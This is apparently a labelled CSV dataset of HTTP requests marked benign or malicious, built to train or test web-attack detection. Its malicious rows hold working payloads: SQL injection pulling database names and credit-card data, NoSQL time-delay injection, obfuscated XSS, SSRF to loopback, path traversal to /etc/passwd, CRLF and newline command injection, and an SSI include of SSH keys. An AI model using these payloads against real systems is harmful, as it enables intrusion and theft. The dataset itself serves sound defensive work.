label,text
benign,"GET /static/v4/scripts/chat-widget.js HTTP/1.1
Host: secure-user-portal.net
Accept: application/javascript
Referer: https://secure-user-portal.net/profile/settings
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"GET /catalog/item/45' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT DATABASE()), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --/details HTTP/1.1
Host: api.secure-user-portal.net
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Referer: https://dashboard.secure-user-portal.net/app/user/recent"
malicious,"GET /dashboard HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/login
X-User-Filter: {""$where"": ""if (this.isAdmin) { var date = new Date(); while((new Date()) - date <= 5000) { /* busy_wait */ } }; return true;""}
Cache-Control: no-cache"
benign,"POST /user/update-profile HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/plain, */*
Origin: https://api.cloud-data-services.ai
Referer: https://api.cloud-data-services.ai/user/settings

firstName=Mila&lastName=Tanaka&email=mila.tanaka%40mailservice.ai&redirect_uri=https%3A%2F%2Fapi.cloud-data-services.ai%2Fuser%2Fsettings%2Fsuccess"
benign,"GET /wiki/Resource_(disambiguation)?section=intro HTTP/1.1
Host: scholarly-research-hub.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"POST /api/v1/upload HTTP/1.1
Host: upload-service.nextgen-cloud.ai
Content-Type: application/json
User-Agent: Python-urllib/3.9
Accept: application/json
Accept-Encoding: gzip
Content-Length: 79

{""redirectUrl"":""http://0x7f.0x0.0x0.0x1/internal/status?check=1""}"
benign,"GET /blog/article/view/523?utm_source=affiliate&utm_medium=partner HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html
Referer: https://forums.community.game-dev-forum.org/topics/latest
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Connection: close"
benign,"GET /api/v1/notifications/unread HTTP/1.1
Host: updates.social-community.club
Accept: application/json
Origin: https://app.social-community.club
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiNjUxMjMifQ.-h8TFqDp_ZvaG1ulHIyGGz0gMTVSo5QRfljCdy-tQTk
Cache-Control: no-cache
Referer: https://app.social-community.club/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"PATCH /api/v3/user/data/update HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 350
Origin: https://www.online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""cartUpdate"",
  ""cart"": {
    ""itemCount"": 7,
    ""lastModified"": ""2024-06-23T11:23:47Z""
  },
  ""userId"": ""usr3d32f"",
  ""promoCode"": """"
}"
malicious,"GET /api/v3/items?action=view&item_id=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.inventory-system.ai%255C%255Cdatafeed%2527%2529%2529%2529--%2520 HTTP/1.1
Host: inventory-system.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_token=93847faddb1c3a4f9a9224673449e93f; preferred_theme=dark
X-Requested-With: XMLHttpRequest"
benign,"POST /webapp/js/live-logger.js HTTP/1.1
Host: event-live-hub.biz
User-Agent: python-requests/2.28.2
Content-Type: application/javascript
Content-Length: 30
Accept: */*
X-Forwarded-For: 192.168.10.15
Connection: keep-alive

console.log('Live logger active');"
benign,"POST /oauth/token HTTP/1.1
Host: auth-secure-portal.io
Content-Type: application/x-www-form-urlencoded
Authorization: Basic Y2xpZW50MTpzZWNyZXQxMjM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive
Content-Length: 104

grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https%3A%2F%2Fapp.auth-secure-portal.io%2Fcallback&client_id=client1&client_secret=secret123"
malicious,"POST /admin/config HTTP/1.1
Host: control-panel.securehost.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-User-Role: admin
Content-Length: 44

{""max_connections"":100,""enable_logs"":false}"
benign,"GET /updates/science/space-exploration-missions HTTP/1.1
Host: cosmosdaily-journal.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_9) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Referer: https://cosmosdaily-journal.org/updates/science
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"PUT /api/users/zm1589 HTTP/1.1
Host: identity-auth.api-authentication.tech
Authorization: Bearer ZGl2aWRlcmNhdG9yMTIzc2VjdXJlCg==
Accept: application/xml
Content-Type: application/xml
Referer: https://identity-auth.api-authentication.tech/dashboard
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Length: 134
Connection: keep-alive

<user>
  <id>zm1589</id>
  <lastLogin>2024-05-28T12:34:56Z</lastLogin>
  <preferences>
    <language>en-US</language>
    <privacyLevel>standard</privacyLevel>
  </preferences>
</user>"
benign,"GET /api/v1/orders?customer_id=78154&status=shipped HTTP/1.1
Host: orders.efficient-sales-platform.biz
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzgxNTQiLCJpc3MiOiJlZmZpY2llbnQtc2FsZXMifQ.TrT27PaSrE2CxQV6pkSyJqvRjp-SK83t0XbXDYppLQE
Accept-Encoding: gzip
Connection: close"
malicious,"POST /app/data/search HTTP/1.1
Host: analytics-datapoint.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript
X-Requested-With: FetchAPIClient
Content-Length: 74

query=records%27]%7D);%20db.logs.remove({user:'attacker'});%20//&limit=10"
benign,"POST /api/v1/modules/script-upload HTTP/1.1
Host: enterprise-workflow-sys.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Content-Type: application/javascript
Content-Length: 36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Accept-Encoding: gzip, deflate
Connection: close

function validate() { return true; }"
benign,"GET /api/v2/search/shop?query=organic%20green%20tea%20loose%20leaf%20bulk%20purchase%20discount%20renewable%20packaging%20supplier%20reviews%20and%20ratings HTTP/1.1
Host: fresh-natural-harvest.biz
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36
Referer: https://fresh-natural-harvest.biz/
Connection: keep-alive"
benign,"POST /support/ticket HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.81.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 2429
Accept: */*
Connection: keep-alive

customer_id=48279&issue_type=Account+Access&priority=Medium&description=I+am+currently+unable+to+access+my+dashboard+after+the+recent+update.+The+login+process+completes+successfully%2C+but+I+am+redirected+to+a+blank+page+instead+of+my+account+overview.+I+have+tried+clearing+my+browser+cache+and+cookies+and+accessing+the+site+from+different+devices+and+browsers%2C+but+the+issue+persistent.+Please+advise+on+any+steps+to+resolve+this+problem+as+it+is+impacting+my+workflows.+Thank+you+for+your+prompt+attention+to+this+matter."
benign,"GET /images/logo.svg HTTP/1.1
Host: online-retail-store.biz
Accept: image/svg+xml,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://online-retail-store.biz/
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Cache-Control: max-age=31536000
Connection: keep-alive"
malicious,"POST /api/v1/feedback/submit HTTP/1.1
Host: feedback-app-cloud.ai
Content-Type: application/json
Accept: application/json
Content-Length: 174
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36

{""email"": ""rachel.m@artistry.biz"", ""user_comment"": ""Great service! Have a look: \u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0068\u0065\u006c\u006c\u006f\u0029"", ""rating"": 5}"
benign,"GET /rss/latest.xml HTTP/1.1
Host: secure-user-portal.net
Accept: application/rss+xml, application/xml;q=0.9
User-Agent: curl/7.79.1
Referer: https://secure-user-portal.net/dashboard
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /search/content?query=how%20to%20bake%20bread HTTP/1.1
Host: family-recipes-archive.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.6
Connection: keep-alive
Referer: https://family-recipes-archive.biz/home"
benign,"POST /api/v2/user/profile/picture HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Length: 202
Connection: keep-alive

{""userId"": ""u82347"", ""imageData"": ""iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABhElEQVQ4T42TTU8CURSGv3vb5kCXwl7y6RqFZcrq0poq1kbufdAT0FESQPrS6ABBQ4OiDfq0gCrSaVFdjQA3BOYLZyZqzyJ+GfnjxlvWlXfDMJ8My+qf4B5pLlOppsMS58AxahZjV5AMKZIjkyWarA4exz6Yo/sfFZHqNyv8zTS1xP7+L4Dg+OxWMAaujHe07TWUG0bER/uR40AO2KD8JE/ZzPHri+OoEZJssKKF06SJD50y2y+Sr5ilFmrAohTqAmjLAh1hY4UEQZbpFDxOPKbZ4mVvI8CLkM6BfmO7JULLDFF2OwWB4ng8yatuAarEiE+2Y1O6+ZRXKWrUfjoV1LCEJ7F6cdOIeKV2sYqv8Fbg/Au+G8001vA3YAz+Yfk+qYnxxgMZPkiTqQT39NUT0fG5fn6qhOhwZpZGEtzTcOnL+xS6GVi7iu7ulx5g1GWyDj65onAvn/5rz+5QEp0f8lgu8bMeeXtTUoOjwdhFxqysZDoAAAAASUVORK5CYII=""}"
benign,"GET /js/vendor/d3.min.js HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/javascript
Referer: https://my-personal-blog-site.info/blog/article/view/123
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"GET /xml_api/search_books?author_id=202%27%20or%20string-length(//users/user[1]/password)%20%3E%205%20or%20%27a%27%3D%27a HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /dashboard/user/summary HTTP/1.1
Host: secure-user-portal.net
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
DNT: 1
Cookie: sessionid=4f9b812d7f3c46a982bcad7741bb7518; logged_in=true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close"
malicious,"GET /view?doc=..%e0%80%ae%e0%80%af..%e0%80%ae%e0%80%af..%e0%80%ae%e0%80%afetc%e0%80%afpasswd HTTP/1.1
Host: mobile-secure-store.cc
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/xml, text/xml, */*
Accept-Encoding: gzip, deflate, br
Connection: close"
malicious,"GET /store/product/555%0d%0aX-Injection-Test:%20Yes%0d%0a%0d%0a<script>document.cookie='pwned=1'</script> HTTP/1.1
Host: online-shopfront.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-shopfront.net/home
Connection: close"
benign,"GET /profile/avatar HTTP/1.1
Host: enterprise-secure-portal.co
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Cookie: sessionId=2a9f105b8c9c47e6bb3af2fa523bb774; lang=en-US
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Connection: close"
benign,"GET /api/v1/media?type=video&duration_short=true&quality=hd HTTP/1.1
Host: stream-center-videos.hosting-cloud.info
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Authorization: Bearer 9a3c1cf7e6614ab7b568dc45d2b3bedc
Connection: keep-alive"
benign,"POST /api/v2/scripts/ads-handler.js HTTP/1.1
Host: advertising-stream.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Type: application/javascript
Content-Length: 44
Accept-Language: en-GB,en;q=0.7
DNT: 1
Connection: keep-alive

console.log('Ads handler script loaded fine');"
benign,"GET /static/v1/css/main.css HTTP/1.1
Host: brightmedia-creative.space
Cookie: session_cookie=94d8a129c17347ab; dark_mode=enabled; font_size=medium
User-Agent: curl/7.87.0
Accept: */*
Connection: keep-alive"
benign,"PUT /users/profiles/8321 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer ZYXv7654321wqplkj2mn34dfg5678erut
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Mobile Safari/537.36
Content-Length: 121

{""firstName"":""Emily"",""lastName"":""Nguyen"",""email"":""emily.nguyen@example.com"",""preferences"":{""newsletter"":false,""notifications"":true},""timezone"":""America/New_York""}"
malicious,"POST /api/comment/submit HTTP/1.1
Host: modern-news-portal.com
Content-Type: application/json
Content-Length: 189
Accept: application/json
User-Agent: Python-urllib/3.9

{""author"": ""carter82"", ""article_id"": 6752, ""comment"": ""Interesting point! Check this URL: \u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
malicious,"POST /signature/check HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
malicious,"GET /items/filter?sort=asc&sort=desc&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: analytics.data-streams.xyz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Referer: https://analytics.data-streams.xyz/report
Connection: keep-alive"
benign,"GET /products;category=books/bestsellers HTTP/1.1
Host: online-biblio-store.ca
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /auth/session HTTP/1.1
Host: login.community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Charset: utf-8, iso-8859-1;q=0.5
Origin: https://community.game-dev-forum.org
Content-Length: 62

user=devguest%00%08console.log('test');&pass=complexP@ss&remember=yes"
malicious,"POST /api/v1/filter/users HTTP/1.1
Host: new-age-finance.io
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 160

{""query"":{""$where"":""function s(){const s=Date.now();while(Date.now()-s<5000){}return true;}return this.username==='admin' && this.password.startsWith('a') || s()""}}"
benign,"OPTIONS /v1/orders/88302/status HTTP/1.1
Host: ecommerce-api-dev.org
Origin: https://partner-dashboard.biz
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: global-knowledge-hub.ai
User-Agent: python-requests/2.30.0
Accept: application/json
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.5
Connection: close"
benign,"POST /user/settings/update HTTP/1.1
Host: secure-login.clientnetwork.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Content-Language: en-US
Origin: https://secure-login.clientnetwork.uk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
Referer: https://secure-login.clientnetwork.uk/user/settings
Connection: close

email_notifications=enabled&timezone=America%2FChicago&privacy=standard"
benign,"GET /news/today/latest-headlines HTTP/1.1
Host: daily-updates-mobile.jp
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja-JP,ja;q=0.8,en-US;q=0.6,en;q=0.4
Accept-Encoding: gzip, deflate, br
Referer: https://daily-updates-mobile.jp/news/today
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
benign,"POST /contact-us HTTP/1.1
Host: community-game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: https://community-game-dev-forum.org
Referer: https://community-game-dev-forum.org/contact-us
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Cookie: user_session=789axc345uioplkj; pref=locale%3Den_GB
Connection: keep-alive

name=Samuel+Nguyen&email=sam.nguyen%40cgdf.org&subject=Bug+report&message=Noticed+a+rendering+issue+on+the+profile+page+with+avatars+not+loading+correctly."
malicious,"POST /user/edit HTTP/1.1
Host: profiles.network-chat.app
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: https://profiles.network-chat.app/user/dashboard
Content-Length: 56

nickname=chatuser%0aps%20aux%20%7C%20grep%20python"
benign,"GET /topics/health-wellness?page=2 HTTP/1.1
Host: forum.wellmind-center.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.5
Referer: https://forum.wellmind-center.info/topics/health-wellness
Cookie: SID=4e9835b779f42921562c214b743bf1a6; csrftoken=8s7g564hdfgw6r3jq4
Connection: keep-alive"
benign,"POST /api/v1/inventory/upload CSV HTTP/1.1
Host: inventory-management.biz
User-Agent: curl/7.81.0
Accept: application/json
Content-Type: text/csv
Content-Length: 113
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive

product_id,product_name,quantity,warehouse
20017,Wireless Mouse,150,WH1
20018,HDMI Cable,300,WH2
20019,Webcam,75,WH3"
benign,"POST /settings/update_profile HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Content-Length: 510
Referer: https://my-personal-blog-site.info/editor
Connection: keep-alive
Cookie: user_session=jqw83hr2nd72ld7p563n62cnm

display_name=Lindsay+Smith&email=lindsay.smith%40personalblog.info&website=https%3A%2F%2Flindsaysmith.blog&bio=Writer+and+photographer+sharing+stories+and+adventures.&twitter=https%3A%2F%2Ftwitter.com%2Flindsmith&facebook=https%3A%2F%2Ffacebook.com%2Flindsay.smith&instagram=https%3A%2F%2Finstagram.com%2Flindsay.photo&linkedin=https%3A%2F%2Flinkedin.com%2Fin%2Flindsay-smith&location=Boston&language=en-US&timezone=America%2FNew_York&show_email=false&newsletter_signup=true&preferred_post_format=markdown&profile_visibility=public&comment_notifications=true&auto_save_drafts=true&link_shortener_enabled=true&max_post_history=50&analytics_tracking_enabled=false&share_to_social=true&private_profile=false"
benign,"GET /stylesheets/theme.default.css HTTP/1.1
Host: research-data-portal.net
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://research-data-portal.net/datasets/health-stats
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"POST /api/log HTTP/1.1
Host: logs.user-engagement.cloud-data-services.ai
User-Agent: curl/7.85.0
Content-Type: application/json
Content-Length: 189
Accept: */*
Connection: keep-alive

{""userId"":""d82f3c59-2e96-4d3f-94c1-c9d6b1f8ac18"",""logs"":{""pageAccess"":{""url"":""/dashboard"",""timestamp"":""2024-06-15T17:24:08Z"",""durationSeconds"":320},""actions"":[{""action"":""download_pdf"",""timestamp"":""2024-06-15T17:28:02Z""}]}}"
benign,"POST /account/login HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Referer: https://online-retail-store.biz/account/login
Origin: https://online-retail-store.biz
Cookie: user_session=V7OhxqLDcnqS9LR9; csrf_token=7b11c46d6cba41a9
User-Agent: curl/7.85.0
Upgrade-Insecure-Requests: 1
Accept: */*
Connection: keep-alive

email=jessica.willis%40shopmail.biz&password=BlueSky#1982"
benign,"PUT /api/v1/inventory/8792 HTTP/1.1
Host: warehouse-central-logistics.com
Authorization: Bearer QWER5643dfjh4567abi0uaa1ooP0z7T8
Accept: application/json
Content-Type: application/json
User-Agent: python-requests/2.31.0
Content-Length: 146
Connection: keep-alive

{""itemId"":8792,""category"":""office supplies"",""quantity"":128,""location"":""A3-Rack22"",""restockThreshold"":25,""supplier"":""PaperWorks Ltd.""}"
malicious,"POST /api/v2/account/profile HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Charset: utf-8, iso-8859-1;q=0.5
Cookie: user_sid=32a5bf684092385f1dfd

username=brian&user_bio=<!--#inClUdE ViRtUaL=""/home/brian/.ssh/authorized_keys"" -->"
benign,"DELETE /inventory/products/electronics/TVX903x1 HTTP/1.1
Host: stock-control-system.biz
Authorization: Bearer 2ecb50466ad195e13aa8c737711f93a8
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: application/json
Connection: keep-alive"
